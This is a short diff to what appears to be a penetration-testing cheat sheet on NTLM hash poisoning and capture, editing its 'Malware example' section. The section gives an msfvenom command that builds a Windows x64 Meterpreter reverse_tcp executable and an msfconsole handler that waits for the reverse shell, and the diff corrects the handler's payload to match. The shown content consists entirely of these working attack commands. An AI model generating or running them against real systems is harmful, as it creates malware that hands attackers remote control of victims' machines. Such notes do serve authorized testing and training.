@@ -15,7 +15,7 @@ Zatruwanie i zbieranie hashy NTLM
 *Serve-Exe = on*  
 ##### Malware example  
 ``msfvenom -p windows/x64/meterpreter/reverse_tcp lhost= $srcIP lport=$lPort -f exe > payload.exe``  
-`` msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srcIP; set LPORT $lPort; run; exit -y;"``  
+`` msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $srcIP; set LPORT $lPort; run; exit -y;"``  
 or
 ``use exploit/multi/handler``  
 ``set lhost _IP_``  
